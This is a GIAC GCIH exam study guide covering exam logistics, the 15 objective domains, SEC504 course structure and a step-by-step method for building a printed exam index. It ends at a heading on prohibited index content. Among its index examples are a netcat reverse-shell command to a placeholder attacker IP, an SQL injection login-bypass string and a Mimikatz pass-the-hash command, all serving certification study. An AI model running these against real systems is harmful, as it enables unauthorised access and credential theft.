
# GIAC Certified Incident Handler (GCIH) — Study Codex v1.0

---

## Section 1: Exam Intelligence — Know the Terrain

## 1.1 Exam Specifications (Current as of 2026)

| Parameter | Specification |
| ----------- | -------------- |
| **Full Name** | GIAC Certified Incident Handler |
| **Exam Code** | GCIH |
| **Issuing Body** | GIAC (Global Information Assurance Certification) |
| **Affiliated Course** | SANS SEC504: Hacker Tools, Techniques, and Incident Handling |
| **Questions** | 106 (including CyberLive hands-on questions) |
| **Duration** | 4 hours (240 minutes) |
| **Passing Score** | 69% (for attempts activated on/after May 10, 2025) |
| **Format** | Multiple-choice + CyberLive practical (VM-based) |
| **Open Book** | Yes — printed materials only (books, notes, index). NO electronics. |
| **Proctoring** | ProctorU (remote) or PearsonVUE (onsite) |
| **Activation Window** | 120 days from activation to sit the exam |
| **Extensions** | 45-day extension available for a fee |
| **Max Lifecycle** | 570 days (original deadline + all extensions/retakes) |
| **Retake Policy** | 30-day wait between attempts; max 3 attempts per year |
| **Reschedule Fee** | $175 reseating fee for late cancellation/no-show |
| **Certification Validity** | 4 years |
| **Renewal** | 36 CPE credits within 4-year cycle, or retake current exam |
| **Renewal Fee** | ~$499 |
| **DoD Compliance** | Approved for DoD 8570/8140 baseline |
| **Accreditation** | ANAB (ISO/IEC 17024) |

### Critical Exam Math

```text
106 questions ÷ 240 minutes = ~2.26 minutes per question

To pass at 69%:  need ≥ 74 correct out of 106
To score 80%:    need ≥ 85 correct out of 106
To score 90%:    need ≥ 96 correct out of 106

BUDGET YOUR TIME:
  CyberLive questions take longer — plan 5-8 min each
  If ~10 CyberLive questions: ~60-80 min on CyberLive
  Remaining ~96 MC questions in ~160-180 min = ~1.7 min each
  Leave 10 min at end for flagged question review
```

## 1.2 What is CyberLive?

CyberLive is GIAC's hands-on practical testing component. During the exam, you'll interact with actual virtual machine environments — running real tools, analyzing real output, and solving real problems. This is not a simulation or screenshot — you're operating live systems.

CyberLive questions test whether you can DO the work, not just recognize the right answer. They may ask you to analyze packet captures, interpret tool output, run commands, or identify artifacts in a live environment. The tools and techniques from SEC504 labs are the primary preparation for these questions.

You cannot index your way through CyberLive. You must have hands-on muscle memory with the tools. This is where lab repetition pays off.

## 1.3 What GCIH Validates

The GCIH proves you can operate on both sides of the incident — understanding how attackers work so you can detect, respond to, and shut them down. It covers the full lifecycle: from reconnaissance through exploitation through persistence through incident response. The mental model is "think like an attacker, act like a defender."

---

## Section 2: Exam Objective Domains

## 2.1 The 15 GCIH Domains (Official)

These are the current exam certification objectives as published by GIAC. Every question maps to one of these domains.

### Domain 1: Incident Response and Cyber Investigation

Understanding the PICERL and DAIR incident handling frameworks and real-world incident response challenges.

**Key concepts:** PICERL (Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned), DAIR (Dynamic Approach to Incident Response: Verify, Scope, Contain, Remediate), IR team structure, jump bag contents, evidence handling, chain of custody, IR communication, stakeholder management, legal considerations, documentation requirements.

**Why it matters:** This is the backbone framework. Everything else in the exam hangs on your understanding of structured incident response. If you can't place an attack technique within the IR lifecycle, you're just memorizing tool flags.

### Domain 2: Scanning and Mapping

Discovering and mapping networks and hosts, revealing services and vulnerabilities, and defending against scanning.

**Key concepts:** Nmap scan types (SYN, connect, UDP, FIN, Xmas, NULL, ACK, idle), Nmap flags and output interpretation, port states (open/closed/filtered/unfiltered), OS fingerprinting, service enumeration, version detection, NSE scripts, Masscan, network mapping, ARP scanning, ICMP reconnaissance, defending against scanning (firewall rules, IDS signatures, log detection).

**Critical tools:** Nmap, Masscan, Netcat (for banner grabbing).

### Domain 3: Understanding Passwords

Identifying password hashes, understanding password weaknesses, and securing passwords.

**Key concepts:** Password hash types (NTLM, NTLMv2, Kerberos, bcrypt, SHA-512, MD5), Windows SAM database, Linux /etc/shadow format, hash salting, password storage best practices, password policy design, multi-factor authentication, credential hygiene, Active Directory password policies, LAPS.

### Domain 4: Attacking Passwords

Conducting password attacks.

**Key concepts:** Dictionary attacks, brute force, hybrid attacks, rainbow tables, credential stuffing, pass-the-hash (PtH), pass-the-ticket (PtT), Kerberoasting, AS-REP roasting, password spraying, LLMNR/NBT-NS poisoning for hash capture, offline vs. online attacks.

**Critical tools:** John the Ripper, Hashcat, Responder, Mimikatz, CrackMapExec.

### Domain 5: Detecting Exploitation and Covert Communications Tools

Identifying and defending against exploitation tools and covert communications.

**Key concepts:** Metasploit framework (modules, payloads, encoders, exploit types), Meterpreter sessions, Netcat (connect-back shells, listeners, relays, file transfers), reverse shells vs. bind shells, payload delivery, staged vs. stageless payloads, covert channels, C2 infrastructure, encrypted C2 traffic detection, beaconing behavior, DNS tunneling.

**Critical tools:** Metasploit, Meterpreter, Netcat (nc/ncat), PowerShell Empire (concepts), Cobalt Strike (concepts).

### Domain 6: Endpoint Attack and Pivoting

Endpoint-specific attacks and pivoting through an environment.

**Key concepts:** Lateral movement techniques, pivoting through compromised hosts, port forwarding (local/remote/dynamic), SSH tunneling, SOCKS proxying, Windows named pipes, RDP hijacking, WMI/WinRM for lateral movement, PsExec and SMBExec, token manipulation, process injection, Living-off-the-Land techniques (LOLBins).

**Critical tools:** SSH, Proxychains, Meterpreter port forwarding, PsExec, Chisel, plink.

### Domain 7: Exploiting Insecure Web Application References

Common methods for exploiting insecure web application references.

**Key concepts:** IDOR (Insecure Direct Object References), directory traversal, path traversal, local file inclusion (LFI), remote file inclusion (RFI), SSRF (Server-Side Request Forgery), insecure deserialization, access control bypass, parameter tampering, forceful browsing.

### Domain 8: Web Application Injection Attacks

Common web application injection attacks.

**Key concepts:** SQL injection (classic, blind, time-based, union-based, error-based), XSS (reflected, stored, DOM-based), command injection, LDAP injection, XML injection / XXE, template injection (SSTI), input validation, parameterized queries, output encoding, WAF bypass techniques.

**Critical tools:** SQLMap, Burp Suite (concepts), browser developer tools.

### Domain 9: Web Application API Attacks

Interacting with and abusing access to web APIs.

**Key concepts:** REST API structure, API authentication (OAuth, JWT, API keys), BOLA (Broken Object Level Authorization), BFLA (Broken Function Level Authorization), rate limiting bypass, API enumeration, GraphQL attacks, mass assignment, JWT manipulation, API abuse for data exfiltration.

### Domain 10: SMB Security

SMB features, vulnerabilities, share discovery and access, and securing the service.

**Key concepts:** SMB protocol versions (SMBv1/v2/v3), SMB signing, null sessions, share enumeration, EternalBlue (MS17-010), SMB relay attacks, NTLM relay, PsExec over SMB, pass-the-hash over SMB, SMB hardening (disable SMBv1, require signing, firewall rules), UNC path injection.

**Critical tools:** Enum4linux, SMBClient, CrackMapExec, Impacket suite.

### Domain 11: Detecting Evasive and Post-Exploitation Techniques

Identifying attackers already in an environment, discovering persistence mechanisms, and detecting actions on objectives.

**Key concepts:** Persistence mechanisms (registry run keys, scheduled tasks, services, WMI event subscriptions, DLL hijacking, startup folders), defense evasion (timestomping, log clearing, disabling security tools, process hollowing, DLL sideloading), privilege escalation (kernel exploits, service misconfigurations, unquoted service paths, token impersonation), data exfiltration, anti-forensics.

**MITRE ATT&CK mapping:** This domain is heavily ATT&CK aligned. Know the tactic categories (Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration, Command and Control).

### Domain 12: Network and Log Investigations

Performing effective investigations of network and log data.

**Key concepts:** Packet capture analysis (TCP handshake, HTTP traffic, DNS queries, TLS handshake), Wireshark filters and analysis, log analysis (Windows Event Logs, Syslog, web server logs, firewall logs), Windows Event IDs (4624/4625 logon, 4648 explicit credentials, 4688 process creation, 4720 account creation, 7045 service install, 1102 log cleared), Sysmon events, timeline analysis, log correlation.

**Critical tools:** Wireshark, tcpdump, grep/awk/sed, Windows Event Viewer, Sysmon, Splunk (concepts).

### Domain 13: Malware and AI Assisted Investigations

Performing basic malware analysis and understanding how AI augments investigations.

**Key concepts:** Static analysis (file hashes, strings, PE headers, imports), dynamic analysis (sandboxing, behavioral analysis), malware types (RAT, ransomware, rootkit, worm, dropper, loader, backdoor), indicators of compromise (IOCs), YARA rules (concepts), using AI/LLMs for log analysis and triage, AI-assisted threat intelligence.

### Domain 14: Integrating LLMs with Offensive Operations

LLM prompt processing, risks, common attack methods, and defending against AI-specific attacks.

**Key concepts:** Prompt injection (direct and indirect), jailbreaking, data poisoning, model exfiltration, AI-generated social engineering, adversarial inputs, LLM in offensive tooling, AI guardrails and safety, defending against AI-enhanced attacks, prompt injection detection.

This domain is NEW in the latest SEC504 update. The AI/LLM offensive and defensive content reflects the evolving threat landscape where attackers leverage AI.

### Domain 15: Securing Credentials and Data in the Cloud

Identifying, defending against, and mitigating password attacks and insecure storage in cloud environments.

**Key concepts:** Cloud credential management (IAM, service accounts, managed identities), cloud secrets storage (AWS Secrets Manager, Azure Key Vault, GCP Secret Manager), insecure storage (S3 buckets, blob storage, exposed credentials in repos), cloud-specific credential attacks, SSRF to metadata services (169.254.169.254), instance metadata exploitation, cloud logging and monitoring.

## 2.2 Domain Weight Estimation

GIAC does not publish exact domain weights. However, based on community analysis and SEC504 course structure, some domains carry more weight than others. Approximate emphasis based on course book page allocation and community feedback:

```text
HEAVY HITTERS (study these deeply):
  ★★★ Incident Response and Cyber Investigation
  ★★★ Scanning and Mapping (Nmap is everywhere)
  ★★★ Detecting Evasive & Post-Exploitation Techniques
  ★★★ Network and Log Investigations

STRONG COVERAGE (know these well):
  ★★  Attacking Passwords
  ★★  Detecting Exploitation and Covert Communications
  ★★  Endpoint Attack and Pivoting
  ★★  Web Application Injection Attacks
  ★★  SMB Security

TARGETED COVERAGE (know key concepts):
  ★   Understanding Passwords
  ★   Exploiting Insecure Web App References
  ★   Web Application API Attacks
  ★   Malware and AI Assisted Investigations
  ★   Integrating LLMs with Offensive Operations
  ★   Securing Credentials and Data in the Cloud
```

---

## Section 3: The SEC504 Course — Your Primary Weapon

## 3.1 Course Structure

SEC504 is structured as a 5-day course plus a Day 6 Capture-the-Flag event. Each day corresponds to a course book. Additionally, there are 1-2 lab workbooks.

```text
SEC504 COURSE DAYS (approximate structure):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Book 1: Incident Response & Cyber Investigation
  - PICERL and DAIR frameworks
  - IR process, team roles, evidence handling
  - PowerShell for IR, AI-assisted analysis
  - Windows/Linux investigation fundamentals

Book 2: Reconnaissance & Scanning
  - Network scanning (Nmap deep dive)
  - Service enumeration
  - Target mapping across Windows, Linux, Azure, AWS
  - Detection of scanning activity

Book 3: Exploitation & Covert Communications
  - Metasploit framework
  - Netcat operations
  - Password attacks (offline/online)
  - SMB attacks and security
  - Web application attacks (injection, SSRF, etc.)

Book 4: Post-Exploitation & Persistence
  - Endpoint attacks and pivoting
  - Lateral movement techniques
  - Persistence mechanisms
  - Defense evasion
  - Credential harvesting

Book 5: Advanced Investigations & Defense
  - Network and log analysis
  - Malware analysis fundamentals
  - AI/LLM offensive and defensive operations
  - Cloud credential security
  - Advanced IR techniques

Day 6 (CTF): Capture the Flag
  - Hands-on exercise applying all concepts
  - Team-based or individual
  - Integrates tools and techniques from Days 1-5
```

## 3.2 Course Materials

```text
WHAT YOU GET WITH SEC504:
━━━━━━━━━━━━━━━━━━━━━━━
  ✦ 5 course books (one per day)
  ✦ 1-2 lab workbooks
  ✦ Day 6 CTF guide
  ✦ MP3 audio recordings (OnDemand)
  ✦ Video recordings (OnDemand)
  ✦ Lab VM environment access
  ✦ SANS cheat sheets (tools, commands, protocols)
  ✦ ~30 hands-on labs across the course
  ✦ Anki flashcard deck (bonus content)
  ✦ MITRE ATT&CK tool mapping (bonus content)

IF BUNDLED WITH GCIH ATTEMPT:
  ✦ 2 practice exams (included with certification attempt)
```

---

## Section 4: The Index — Your Most Important Artifact

```text
═══════════════════════════════════════════════════════════════
  The index is not just a lookup table.
  The index IS the study process.
  Building it forces you through the material.
  Using it proves you built it well.
  
  60% of your prep time should be spent building the index.
  By exam day, you'll know 80% of the answers WITHOUT it.
  The other 20% is why you have it.
═══════════════════════════════════════════════════════════════
```

## 4.1 Why the Index Matters — The Math

You have 106 questions in 240 minutes. That's roughly 2 minutes and 15 seconds per question. CyberLive hands-on questions eat 5-8 minutes each. If there are 10 CyberLive questions, that's 50-80 minutes gone — leaving you roughly 1 minute 40 seconds per multiple-choice question.

Now imagine a question asks about a specific Nmap flag you can't quite remember. Without an index, you have to figure out which of the 5 course books covers Nmap, grab the right one, flip to roughly the right section, scan pages for the answer. That's 3-5 minutes — and you just blew the time budget for 2-3 other questions.

With a good index, you flip to "N," find "Nmap > flags > FIN scan," and the answer is right there in your description column. Thirty seconds. Done. Move on.

The difference between a good index and no index is the difference between finishing the exam with time to review flagged questions and running out of time with 15 questions unanswered. The index doesn't just help — it's the single biggest predictor of whether you finish the exam.

## 4.2 Two Schools of Thought (And Which One You Should Use)

**School A: Lean & Mean** — Keywords + book/page references only. Your index is a road map that points you to the right page in the right book. Fast to scan, compact to print. Best for people who already have years of experience with the concepts and just need a quick "where was that one thing?"

**School B: Self-Contained** — Keywords + book/page + brief description/definition. Your index IS the answer without needing to open a book at all. Larger to print, but dramatically faster to use under pressure. Best for people taking their first GIAC exam or working with material that's not yet deeply internalized.

**For the battle buddy pair:** The less-experienced partner should use School B without question. Having the definition right there eliminates the time-costly step of finding the right book, flipping to the page, and scanning for the answer. When you're stressed and the clock is ticking, you don't want to be hunting through 1,000+ pages of course material for one fact. You want the fact staring at you from your index.

The experienced partner can use School A or School B — either works. But if you're tempted to skip the index entirely because "I already know this stuff," don't. GIAC questions test minutiae that even experienced practitioners don't carry in their heads — specific tool flags, exact Event ID numbers, precise framework step ordering. The index catches the edge cases your memory won't.

## 4.3 Spreadsheet Setup — Step by Step

This is the exact workflow. Follow it in order.

### Step 1: Create Your Spreadsheet

Open Google Sheets or Excel. Create the following tabs:

```text
TAB STRUCTURE:
━━━━━━━━━━━━━
Tab 1:  "504.1" (Book 1 — IR & Investigation)
Tab 2:  "504.2" (Book 2 — Recon & Scanning)
Tab 3:  "504.3" (Book 3 — Exploitation & Comms)
Tab 4:  "504.4" (Book 4 — Post-Exploitation)
Tab 5:  "504.5" (Book 5 — Advanced Investigations)
Tab 6:  "Labs"  (Lab workbook content)
Tab 7:  "Cheat Sheets" (SANS cheat sheet content)
Tab 8:  "Master" (will be created later — the merged, sorted index)
```

### Step 2: Set Up Column Headers

In each book tab (504.1 through 504.5), create four columns:

```text
| Column A: Keyword | Column B: Description | Column C: Page | Column D: Book |
```

**Column A — Keyword:** The term, tool name, concept, or technique. This is what you'll search for under exam pressure. Think about what word would pop into your head if you saw this concept in a question. That's your keyword.

**Column B — Description:** A brief definition or explanation IN YOUR OWN WORDS. One to two sentences maximum. If it's a tool, include the key command syntax. If it's a concept, include the "so what" — why it matters or how it's used. This column is the answer to exam questions.

**Column C — Page:** The page number in the course book where this content lives. If it spans multiple pages, use a range (e.g., "45-48"). This is your backup — if the description isn't enough, you can flip to the exact page.

**Column D — Book:** The book number (1-5). On exam day with five books in front of you, this tells you which book to grab.

### Step 3: Populate During Your First Read-Through

As you read each page of each course book, ask yourself: "If this concept appeared in an exam question, what word would I search for?" Write that word in Column A, note the page and book number. Don't write descriptions yet — just capture keywords and locations. This is Pass 1 (Scaffolding).

Target: 2-4 keywords per page that has notable content. Skip pages that are just filler, introductions, or blank.

Here's what the raw scaffold looks like at this stage:

```text
504.2 TAB (Pass 1 — keywords only):

| Keyword          | Description | Page | Book |
|------------------|-------------|------|------|
| SYN scan         |             | 34   | 2    |
| TCP connect scan |             | 35   | 2    |
| UDP scan         |             | 38   | 2    |
| Nmap -sV         |             | 42   | 2    |
| banner grabbing  |             | 42   | 2    |
| NSE scripts      |             | 47   | 2    |
| OS fingerprint   |             | 51   | 2    |
| Masscan          |             | 55   | 2    |
| port states      |             | 36   | 2    |
| filtered port    |             | 36   | 2    |
```

This is fast and rough. That's intentional. You're mapping the terrain, not writing the field manual yet.

## 4.4 Writing Good Descriptions — The Art That Wins Exams

This is where most people either do too little or too much. A good description answers the exam question without you needing to open a book. A bad description is either too vague to be useful or too long to scan quickly.

### The Formula

For each entry, write 1-2 sentences that answer: **What is it? Why does it matter? How do you use it / detect it?**

Not all three apply to every entry. Use what fits.

### Good vs. Bad Examples — Across Multiple Domains

```text
DOMAIN: Scanning & Mapping
━━━━━━━━━━━━━━━━━━━━━━━━━

❌ BAD:  "SYN scan — a type of Nmap scan"
   (Too vague. Doesn't tell you what makes it different.)

❌ BAD:  "SYN scan — sends a SYN packet to each port on the 
   target host and waits for responses. If a SYN-ACK is received,
   the port is open. If RST is received, the port is closed. If 
   no response, the port may be filtered. Also called half-open
   scanning because the three-way handshake is never completed,
   making it stealthier than a full TCP connect scan. Requires
   root/admin privileges because it uses raw sockets..."
   (Too long. You'll never scan this fast enough under pressure.)

✅ GOOD: "SYN scan — nmap -sS. Half-open (SYN→SYN-ACK=open,
   RST=closed). Default w/ root. Stealthier than -sT because
   handshake never completes."
   (What it is, the flag, the key behavior, why it matters. Done.)
```

```text
DOMAIN: Password Attacks
━━━━━━━━━━━━━━━━━━━━━━━━

❌ BAD:  "Kerberoasting — an attack on Kerberos"

✅ GOOD: "Kerberoasting — request TGS tickets for SPNs, crack
   offline. Targets service accounts with weak passwords. Tools:
   Rubeus, GetUserSPNs.py (Impacket). Detect: Event 4769 with
   RC4 encryption (0x17) for service tickets."
```

```text
DOMAIN: Post-Exploitation
━━━━━━━━━━━━━━━━━━━━━━━━━

❌ BAD:  "Scheduled tasks — persistence"

✅ GOOD: "Scheduled tasks (persistence) — schtasks /create to
   survive reboot. Detect: Event 4698 (task created), check
   Task Scheduler Library for unsigned executables. ATT&CK T1053."
```

```text
DOMAIN: Network & Log Investigation
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ BAD:  "Event 4624 — logon event"

✅ GOOD: "Event 4624 — successful logon. Key fields: Logon Type
   (3=network, 10=RDP, 7=unlock), source IP, account name.
   Compare with 4625 (failed) for brute force detection."
```

```text
DOMAIN: Exploitation & Covert Communications
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ BAD:  "Reverse shell — opposite of bind shell"

✅ GOOD: "Reverse shell — target connects BACK to attacker's
   listener. Bypasses inbound firewall rules (outbound usually
   allowed). nc -e /bin/sh <attacker_IP> 4444 on target,
   nc -lvp 4444 on attacker. Harder to detect than bind shell."
```

```text
DOMAIN: Web Application Attacks
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ BAD:  "SQL injection — injecting SQL into web forms"

✅ GOOD: "SQL injection — input not sanitized, attacker inserts
   SQL logic. Test: ' OR 1=1-- in login. Types: union-based
   (extract data), blind (true/false responses), time-based
   (WAITFOR DELAY). Fix: parameterized queries, never string
   concat. Tool: sqlmap."
```

### The Tool Command Pattern

Every tool that appears in SEC504 labs is a potential exam question. For tools, your description should include the specific command syntax with common flags. GIAC loves asking "which flag does X?" questions.

```text
TOOL INDEXING PATTERN:

| Keyword | Description | Page | Book |
|---------|-------------|------|------|
| nmap -sS | SYN scan (half-open). Default w/ root. Stealthier than -sT. | 34 | 2 |
| nmap -sV | Version detection. Banner grabs to ID services. Noisy. | 42 | 2 |
| nmap -sC | Default NSE scripts. Safe category. Combines well with -sV. | 47 | 2 |
| nmap -O | OS fingerprinting. TTL + window size + options analysis. Needs 1 open + 1 closed port. | 51 | 2 |
| nmap -Pn | Skip host discovery. Treat all hosts as up. Use when ICMP blocked. | 39 | 2 |
| nmap -p- | Scan ALL 65535 ports. Slow but thorough. | 40 | 2 |
| nmap -A | Aggressive: -sV + -sC + -O + traceroute combined. Very noisy. | 52 | 2 |
| nmap --top-ports | Scan top N most common ports. --top-ports 100 is a good fast scan. | 41 | 2 |
| nmap -oN / -oX / -oG | Output: Normal / XML / Grepable. -oA does all three at once. | 53 | 2 |
```

Notice every Nmap flag gets its OWN row. This is intentional. If an exam question asks "which Nmap option performs version detection?" you flip to "N," scan down to "nmap -sV," and the answer is right there. You don't need to find the Nmap section in Book 2 and read three pages.

This same pattern applies to every tool: Metasploit commands, Netcat flags, Wireshark display filters, tcpdump capture filters, Hashcat modes, John rules. Every flag, every mode, every syntax variant gets its own row.

## 4.5 The Synonym and Cross-Reference Strategy

Your stressed exam brain will not always search for the "correct" term. Sometimes you'll think "lateral movement" when the index says "pivoting." Sometimes you'll think "C2" when you indexed it under "Command and Control." This is the #1 reason people can't find things under pressure — their search term doesn't match their index term.

The fix: index the same concept under multiple keywords.

```text
SYNONYM ENTRIES (all point to the same content):

| C2 | see: Command and Control | 89 | 5 |
| Command and Control | Periodic beaconing to attacker server. Detect: regular interval HTTP/DNS, jitter. DNS tunneling, encrypted channels. | 89 | 5 |
| Covert channel | see: Command and Control | 89 | 5 |
| Beaconing | see: Command and Control | 89 | 5 |

| PtH | see: Pass-the-Hash | 78 | 3 |
| Pass-the-Hash | Use NTLM hash directly (no cracking). Mimikatz sekurlsa::pth. Detect: Event 4624 Type 3 + 4672 from unexpected source. | 78 | 3 |

| Reverse shell | Target connects back to attacker listener. Bypasses inbound FW. nc -e, bash -i, PowerShell one-liner. | 67 | 3 |
| Connect-back shell | see: Reverse shell | 67 | 3 |
| Callback shell | see: Reverse shell | 67 | 3 |
```

The "see:" entries are cheap — they take one line and 5 seconds to add. But under exam pressure, they can save you 2 minutes of confused searching. Add them generously. It's better to have a concept indexed three ways than to not find it when you need it.

Also add cross-references for related concepts:

```text
| Kerberoasting | ...description... See also: AS-REP Roasting, SPN | 112 | 3 |
```

## 4.6 Color Coding — Making Your Index Scannable

Color coding transforms a wall of text into a visually scannable reference. When you're scanning your printed index under pressure, color lets your eyes jump to the right category before you even read the keywords.

```text
COLOR CODING STRATEGY:
━━━━━━━━━━━━━━━━━━━━━

Pick 5-6 colors. Assign each to a theme. Apply as background
shading to the keyword cell (Column A) in your spreadsheet.
When you print, the colors show up and make scanning fast.

RECOMMENDED MAPPING FOR GCIH:

  🔵 BLUE    = Tools & Commands
              (Nmap, Metasploit, Netcat, Wireshark, Hashcat, etc.)

  🔴 RED     = Attacks & Techniques
              (SQLi, XSS, PtH, Kerberoasting, pivoting, etc.)

  🟢 GREEN   = Defense & Detection
              (Event IDs, IDS signatures, firewall rules, IR steps)

  🟡 YELLOW  = Cloud & Web
              (AWS, Azure, API attacks, cloud credentials, SSRF)

  🟣 PURPLE  = Frameworks & Processes
              (PICERL, DAIR, ATT&CK, evidence handling, legal)

  🟠 ORANGE  = Protocols & Architecture
              (SMB, TCP/IP, Kerberos, DNS, HTTP, TLS)
```

In Google Sheets, select the cell(s), click the paint bucket icon, and pick the color. Do this as you go during Pass 2 — don't try to color-code everything at the end.

When you print your index, use a color printer. If you don't have one, use Staples/FedEx/Office Depot print services. The $15 for color printing is worth more than almost any other exam investment.

## 4.7 The Complete Three-Pass Process

### Pass 1: Scaffolding (During Course / First Read-Through)

**When:** As you read each course book for the first time, or during the live course.

**What you're doing:** Capturing keywords and page/book references only. No descriptions yet. You're building the skeleton.

**How:** For each page with notable content, create a row in the appropriate book tab. Write the keyword that would make you think of this content during an exam, note the page number, note the book number. Move on.

```text
PASS 1 RULES:
━━━━━━━━━━━━
✦ Speed over perfection — you'll refine later
✦ 2-4 keywords per notable page
✦ Skip filler pages, intros, "about the author" pages
✦ When in doubt, capture it — you can prune later
✦ Don't write descriptions yet (they slow you down)
✦ If a lab teaches a tool, capture every command used in the lab
✦ If you see a diagram or flowchart, capture the concept name
```

**Target completion:** End of your first pass through all 5 books. If taking SEC504 live, you should have a rough scaffold by the end of the course week.

**Expected size:** 300-500 raw keyword entries across all tabs.

### Pass 2: Enrichment (Second Read-Through)

**When:** After you've completed the course material. Weeks 5-6 in the study plan.

**What you're doing:** Going back through every scaffold entry and adding descriptions, command syntax, and color coding. This is where the deep learning happens.

**How:** For each entry in each book tab, re-read the relevant page(s) in the course book. Write a 1-2 sentence description IN YOUR OWN WORDS. Apply color coding. Add synonym entries and cross-references.

```text
PASS 2 RULES:
━━━━━━━━━━━━
✦ Write descriptions in YOUR words, not copy-paste from the book
    (your brain remembers what your hands wrote)
✦ Apply color coding as you go
✦ Add synonyms for every term that has common alternatives
✦ For every tool: include the exact command syntax and key flags
✦ For every Event ID: include what it means AND what to look for
✦ For every attack: include the tool used AND how to detect it
✦ For every defense: include what it defends AGAINST
✦ Cross-reference related concepts with "see also:" notes
✦ Index the SANS cheat sheets (they have content not in the books)
✦ Index the lab workbook (lab procedures are CyberLive prep)
```

**After enriching all book tabs, build the Master tab:**

```text
BUILDING THE MASTER INDEX:
━━━━━━━━━━━━━━━━━━━━━━━━━
1. Create the "Master" tab in your spreadsheet
2. Copy all rows from tabs 504.1 through 504.5, Labs, and
   Cheat Sheets into the Master tab
3. Ensure every row has the Book column filled in
4. Sort the entire Master tab alphabetically by Column A (Keyword)
5. Remove any duplicate entries (keep the better description)
6. Add page breaks between letter changes (A→B, B→C, etc.)
7. Clean up formatting: consistent font, consistent column widths

Your Master tab is now your exam index. Everything from here
forward operates on the Master tab.
```

**Expected size:** 400-700 entries in the Master tab after merging and deduplication.

### Pass 3: Refinement (After Practice Test 1)

**When:** Immediately after Practice Test 1. Week 7 in the study plan.

**What you're doing:** Using practice test results to find holes in your index and fix them.

**How:** During Practice Test 1, keep a notepad next to you. Every time you encounter a question where you either (a) couldn't find the answer in your index, (b) found it but it took too long, or (c) found it but the description wasn't helpful enough — write down the topic. After the test, update your index.

```text
PASS 3 — POST-PRACTICE-TEST REFINEMENT:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
For each topic you struggled with:

  COULDN'T FIND IT → Add the entry. Add synonym entries too.
  Ask yourself: "What did I search for?" That search term
  should be a keyword in your index.

  FOUND IT BUT TOO SLOW → Add more synonyms. Your first
  instinct search term should have a direct entry, even if
  it's just a "see:" reference.

  DESCRIPTION WASN'T HELPFUL → Rewrite it. Make it answer
  the question directly. If the question asked about a
  specific flag, put the flag in the description.

  GOT THE QUESTION WRONG → Go back to the course material.
  Re-read the section. Rewrite the description. If you
  misunderstood a concept, your original description
  probably reflects that misunderstanding.

ALSO:
  Prune entries you didn't need and will never need.
  Every unnecessary entry makes the useful ones harder to find.
```

**After Practice Test 2 (Week 9):** Repeat this refinement. Your index should be getting tighter and faster with each iteration. By this point, you'll notice you're barely using the index for most questions — that's the point. The construction process taught you the material.

## 4.8 Preparing Your Physical Books

Your index isn't the only physical reference you'll have. You're also bringing 5 course books (printed or physical). These need to be prepared too.

### Book Tabbing

Add colored sticky tabs to key pages in each book. You won't tab every page — just the high-value pages you'll want to find fast. Good candidates: tool reference pages, cheat sheets embedded in the text, critical diagrams, important tables.

Write 1-3 words on each tab in permanent marker so you can read them without opening the book.

### Book Edge Coloring (The Fast-Grab Trick)

When you have 5 books stacked on your desk during the exam, grabbing the right one is harder than you think — they all look the same. Here's the fix:

```text
BOOK EDGE COLORING:
━━━━━━━━━━━━━━━━━━
Get 5 different colored markers (wide tip works best).

For each book, color the TOP edge of ALL pages in that
book's assigned color. Just run the marker across the
exposed page edges with the book closed.

  Book 1 (IR):           GREEN edge
  Book 2 (Scanning):     BLUE edge
  Book 3 (Exploitation): RED edge
  Book 4 (Post-Exploit): ORANGE edge
  Book 5 (Advanced):     PURPLE edge

Now when you're looking at a pile of books from the side,
you can instantly grab "the red one" (Book 3) without
reading the cover. This saves 5-10 seconds per lookup —
and when you're doing 30 lookups during the exam, that's
2-5 minutes recovered.
```

## 4.9 Printing and Binding Your Index

Your index exists digitally in a spreadsheet. On exam day, it must exist on paper. No laptops, no tablets, no phones.

```text
PRINT FORMATTING:
━━━━━━━━━━━━━━━━
Font size:      10pt (readable but compact)
Orientation:    Landscape (gives more width for the description column)
Print:          Double-sided
Column widths:  Keyword ~20%, Description ~55%, Page ~10%, Book ~10%
Headers:        Repeat column headers on every page
Page breaks:    Between each letter section (A→B, B→C, etc.)
Color:          USE A COLOR PRINTER — your color coding is useless in B&W

TARGET LENGTH:
  School A (lean):          15-25 pages printed
  School B (self-contained): 30-50 pages printed
  If over 60 pages, you need to prune — too long is too slow

BINDING:
  ✅ Spiral bound (Staples/FedEx can do this for ~$5)
     — Lays flat on a desk, easy to flip, compact
  ✅ Comb bound (same shops)
     — Similar to spiral, slightly easier to remove pages
  ❌ Three-ring binder — too bulky, takes up too much desk space
  ❌ Stapled corner — falls apart, hard to flip
  ❌ Loose pages — will scatter, will get out of order, disaster
```

### Tab Dividers

Buy a set of A-Z tab dividers (the heavy-duty plastic ones from any office supply store). Insert them between letter sections in your printed index. This lets you flip directly to the right letter without scanning page by page.

Between your color coding, tab dividers, and alphabetical sorting, you should be able to find any concept in your index within 10-15 seconds. That's the target.

## 4.10 Speed Drills — Training to Use Your Index Fast

Building a good index is half the battle. Using it fast under pressure is the other half. Practice before exam day.

```text
SPEED DRILL PROCEDURE:
━━━━━━━━━━━━━━━━━━━━━
1. Write 20 random GCIH terms on separate index cards
   (mix of tools, attacks, Event IDs, concepts, acronyms)

2. Shuffle the cards

3. Start a timer

4. Flip a card → find the term in your printed index → read
   the description aloud → flip next card

5. Target: under 15 seconds per lookup

If any term takes more than 20 seconds:
  → The entry might be missing (add it)
  → It might be under a different keyword (add a synonym)
  → It might be in a bad position (check alphabetical sort)
  → Your tab dividers might need adjustment

SAMPLE DRILL CARDS:
  "Kerberoasting"
  "Event 4688"
  "nmap -sX"
  "DAIR Verify step"
  "Pass-the-Hash"
  "Reverse shell"
  "SMB relay"
  "SSRF"
  "PICERL Containment"
  "Meterpreter migrate"
```

Do this drill 2-3 times in the week before your exam. It builds the muscle memory of flipping to the right section and scanning for keywords. On exam day, this will feel automatic.

## 4.11 What NOT to Put in Your Index

```text
PROHIBITED (GIAC POLICY VIOLATIONS):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
